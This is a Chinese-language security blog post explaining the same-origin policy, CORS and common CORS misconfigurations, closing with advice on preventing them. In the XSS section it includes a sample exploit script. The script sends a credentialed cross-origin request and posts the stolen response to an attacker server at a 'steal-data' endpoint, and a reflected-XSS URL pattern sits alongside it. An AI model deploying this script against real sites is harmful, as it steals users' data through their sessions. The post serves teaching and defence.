#  CORS漏洞   
原创 AlertSec  AlertSec   2024-12-16 11:03  
  
## 同源策略  
  
讲CORS之前，先来了解一下什么是同源策略。  
  
同源策略（SOP）是浏览器的一种安全策略，用来防止不同源的网站之间使用JavaScript读取资源；源由三部分组成，如下：  
  
1、协议  
  
2、域名  
  
3、端口  
  
三者全部相同即为同源，只要有一项不一样，那就是不同源。  
## 跨域资源共享  
  
跨域资源共享（CORS）也是浏览器的一种安全策略，为了放宽同源策略，实现跨源访问。  
### Origin  
  
在CORS中，浏览器向不同源服务器发送请求时，请求中会附带一个Origin请求头，用来声明自己的源。  
### Access-Control-Allow-Origin  
  
被请求的网站服务器响应时，响应包中会附带一个Access-Control-Allow-Origin响应头，该响应头指定了哪些来源被允许访问。  
### Access-Control-Allow-Credentials  
  
Access-Control-Allow-Credentials响应头是用来规定，浏览器发送跨源请求时，是否允许携带用户凭证（cookie、账号密码等），值为true，即为允许携带，false是不允许（默认），不允许时，响应不附带Access-Control-Allow-Credentials头。  
### 放宽CORS  
  
Access-Control-Allow-Origin响应头支持通配符*来放宽CORS，也就是任何来源都允许跨源访问，但是不能携带用户凭证，即Access-Control-Allow-Credentials不为true。  
### CORS简单请求  
  
大致可以分为3步。  
  
1、客户端向服务端发送跨源请求，请求中附带Origin请求头，用来声明自己的源。  
  
2、服务端收到请求后，会检查Origin中的来源是否允许跨源访问自己，如果允许，响应时会附带Access-Control-Allow-Origin响应头，并声明允许跨源访问的来源；不允许的话，则不会附带Access-Control-Allow-Origin响应头，或值为其他来源（允许与否，都会响应）。  
  
3、客户端收到响应后，查看是否附带Access-Control-Allow-Origin响应头，如果没有，即访问失败，如果有，则检查其内容是否包含自己的源，如果包含，即访问成功，不包含则失败。  
### CORS复杂请求  
  
简单请求问题在于，请求如果是增、删、改敏感操作的话，无论来源是否被允许，都会响应，很不安全，所以就会用到复杂请求。  
  
复杂请求时，客户端会先向服务端发一个预检请求（OPTIONS），询问服务端是否允许实际请求使用的HTTP方法或自定义的请求头，如果允许，服务端再把实际的请求发给服务端，如果不允许，就没有后续了。  
  
**复杂请求定义**  
  
CORS规范定义了复杂请求的条件，两点，满足一点即为复杂请求。  
  
1、使用非简单HTTP方法。  
  
<table><thead><tr><th valign="top" style="color: rgb(0, 0, 0);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">简单</span></section></th><th valign="top" style="color: rgb(0, 0, 0);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">复杂</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">GET</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">PUT</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">POST</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">DELETE</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">HEAD</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">PATCH</span></section></td></tr></tbody></table>  
  
2、使用非简单请求头。  
  
<table><thead><tr><th valign="top" style="color: rgb(0, 0, 0);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">简单</span></section></th><th valign="top" style="color: rgb(0, 0, 0);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">复杂</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Accept</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Authorization</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">User-Agent</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">X-Requested-With</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Content-Type:text/plain等等</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Content-Type:application/json</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">......</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">......</span></section></td></tr></tbody></table>  
  
预检请求涉及到两个头，Access-Control-Allow-Methods和Access-Control-Allow-Headers。  
  
在请求中，Access-Control-Allow-Methods是客户端实际请求要使用的方法，Access-Control-Allow-Headers是客户端实际请求要使用的HTTP头。  
  
在响应中，Access-Control-Allow-Methods是服务端允许的HTTP方法，Access-Control-Allow-Headers是服务端允许的请求头。  
  
例如：  
  
请求  
```
OPTIONS /test HTTP/1.1Host: example.comOrigin: https://test.comAccess-Control-Request-Method: PUTAccess-Control-Request-Headers: Authorization
```  
  
响应  
```
HTTP/1.1 200 OKAccess-Control-Allow-Origin: https://test.comAccess-Control-Allow-Methods: PUTAccess-Control-Allow-Headers: Authorization
```  
## CORS漏洞  
  
有时候对CORS配置不当，会造成很多安全问题，如下情况：  
### 根据Origin请求头动态生成ACAO响应头  
  
服务端对Origin没有任何验证，而是根据Origin的内容动态生成Access-Control-Allow-Origin（ACAO），也就是说，服务器允许任何来源跨源访问，如下图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KpY8uRYvbCic7IRg35JXINE5VpZXUElEoaxtDZEuAGSXl9jy2ckOLdhibkH5vsspDJvMZqCf0XRbNSmSsvwicX4vg/640?wx_fmt=png&from=appmsg "")  
### 正则匹配配置错误  
  
当允许跨域访问的来源比较多时，可能会使用正则表达式来进行匹配，如果正则匹配过于宽松或配置不当，就会造成安全问题，如下情况：  
  
允许所有子域名跨源访问，但错误配置正则表达式，如下：  
```
^https?://.*example\.com$^：           起始符，表示从这里开始匹配。https?：      s?是指s可有可无，http、https都可以匹配。://：         协议分隔符。.*：          .是任意字符，*是任意次数，表示任意长度的字符串，可为空。example\.com：在正则中，.是任意字符，需要用\转义，转义后就是域名example.com。$：           结束符，表示到这匹配就结束了。
```  
  
大致意思就是允许所有以example.com结尾的来源，虽然满足了所有子域名可以跨源访问，但是也允许了以example.com结尾的其他域名，如testexample.com、hackexample.com。  
  
也有允许以example.com开头的情况，正则表达式如下：  
```
^https?://normal-website\.com.*
```  
  
这就允许了以example.com开头的其他域名跨源访问，如example.com.test.com、example.com.hack.com。  
### null来源列入白名单  
  
有些时候，客户端发送跨源请求时，Origin请求头会为空，如下情况：  
  
1、使用file协议跨源访问：file协议是访问的本地文件，没有来源，所以为空。  
  
2、跨源访问被重定向：如果重定向目标和原始目标不同源，请求Origin则为空。  
  
3、请求中包含序列化数据：请求中有json或xml这样的数据，浏览器为了安全会将Origin设置为空。  
  
服务端为了让Origin为空时，也可以正常跨源访问，就会将null列入CORS白名单，如下图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KpY8uRYvbCic7IRg35JXINE5VpZXUElEoLcpzL7e7452uia3r8OUUHibEecHaV5icyhoptATGLrpicLMVOeRUWrINsA/640?wx_fmt=png&from=appmsg "")  
### 利用CORS白名单进行XSS攻击  
  
假设https://example.com存在XSS漏洞，可以利用CORS白名单，向信任https://example.com来源的网站进行XSS攻击。  
  
请求：  
```
GET /test HTTP/1.1Host: test.comOrigin: https://example.comCookie: sessionid=...
```  
  
响应：  
```
HTTP/1.1 200 OKAccess-Control-Allow-Origin: https://example.comAccess-Control-Allow-Credentials: true
```  
  
反射型XSS：  
```
https://example.com?xss=<script>cors-exp-code</script>
```  
  
存储型XSS：  
  
直接把cors-exp-code注入到漏洞点即可。  
  
前提：  
  
需要受害者和目标网站保持会话，利用代码需要满足三点，能获取受害者cookie，并且访问目标网站，还能把获取的资源返回给攻击者。  
  
参考cors-exp-code：  
```
<script>    // 发送跨源请求    fetch('http://target.com', {        method: 'GET', //请求的 HTTP 方法        credentials: 'include',  // 自动获取受害者 cookie ，用受害者 cookie 发送请求    })    .then(response => response.json())  // 将返回的 JSON 数据转换为 JS 对象，根据实际情况修改    .then(data => {        // 将数据转发到攻击者        fetch('http://localhost:3000/steal-data', {  // 攻击者的服务器            method: 'POST', //请求的 HTTP 方法            headers: {                'Content-Type': 'application/json', //数据为 JSON 格式            },            body: JSON.stringify(data)  // 将 JS 对象转换为 JSON 发给服务器        });    });</script>
```  
### CORS白名单允许不安全子域  
  
目标使用的https协议，但是配置CORS白名单时，允许http协议的子域跨源访问，攻击者可以通过中间人攻击向目标发起CORS攻击，获取资源。  
  
https://example.com http://test.example.com  
  
1、受害者请求随便一个http网站。  
  
2、攻击者拦截请求，修改响应内容为重定向到http://test.example.com。  
  
3、受害者遵循重定向，向http://test.example.com发请求。  
  
4、攻击者拦截请求，修改响应内容为跨源访问https://example.com，并且将内容返回攻击者。  
  
5、受害者跨源请求https://example.com，获取内容返回攻击者。  
  
6、攻击者收到内容。  
### CORS配置通配符访问内网资源  
  
只允许内部网络访问的资源，但CORS配置为通配符*，允许任何来源跨源访问，导致攻击者可以从外部网络访问目标内部资源。  
```
HTTP/1.1 200 OKAccess-Control-Allow-Origin: *
```  
  
ACAO使用通配符放宽CORS的前提是，请求不能携带用户凭证，所以只能访问没有凭证限制的资源。  
  
攻击者向内网环境用户发送恶意文件或链接，内容为请求https://example.com/password.txt，获取的内容返回给攻击者，利用CORS配置错误访问内网资源。  
## 预防攻击  
  
CORS漏洞一般都是错误配置CORS造成的，如果需要预防或修复，需要正确配置CORS策略。  
### 使用CORS白名单  
  
把允许跨源访问的来源加入CORS白名单，如果不是白名单中的来源，请求一律拒绝，如果使用正则匹配，确保正则表达式可以正确匹配允许的来源。  
### 通配符*和空来源null  
  
禁止Access-Control-Allow-Origin配置为*，严禁把null列入CORS白名单。  
### 限制HTTP方法和请求头  
  
明确规定允许的HTTP方法和请求头，并指定哪些场景被允许，避免通过跨源进行敏感操作。  
## 总结  
  
如果你对安全感兴趣，别忘了关注我们，持续为你带来最新的安全动态与技术分享！  
  
